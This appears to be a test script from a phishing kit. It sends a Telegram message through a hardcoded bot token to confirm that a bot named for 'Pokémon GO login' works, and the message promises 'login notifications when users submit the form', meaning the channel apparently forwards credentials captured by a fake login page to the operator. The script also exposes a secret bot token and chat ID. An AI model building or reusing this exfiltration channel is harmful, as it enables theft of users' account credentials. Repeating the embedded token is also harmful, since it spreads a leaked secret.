const https = require('https');

const BOT_TOKEN = "8215904112:AAH06c70RFrcJtI0QfIa0dygrzCIF3_3rFM";
const CHAT_ID = "8505265800";

const message = `🎮 *Pokémon GO Login Test*

✅ Bot is working perfectly!
🤖 Bot: @PokemonGOlogin_bot
👤 Chat ID: ${CHAT_ID}
📱 Test Message: ${new Date().toLocaleString()}

🔔 You will receive login notifications when users submit the form!`;

console.log('📤 Sending test message to Telegram...');

const data = JSON.stringify({
    chat_id: CHAT_ID,
    text: message,
    parse_mode: 'Markdown'
});

const options = {
    hostname: 'api.telegram.org',
    path: `/bot${BOT_TOKEN}/sendMessage`,
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
    }
};

const req = https.request(options, (res) => {
    let responseData = '';
    
    res.on('data', (chunk) => {
        responseData += chunk;
    });
    
    res.on('end', () => {
        try {
            const response = JSON.parse(responseData);
            if (response.ok) {
                console.log('✅ Test message sent successfully!');
                console.log('📱 Check your Telegram - you should have received a message!');
            } else {
                console.log('❌ Error sending message:', response.description);
            }
        } catch (error) {
            console.log('❌ Error parsing response:', error.message);
        }
    });
});

req.on('error', (error) => {
    console.log('❌ Request error:', error.message);
});

req.write(data);
req.end();
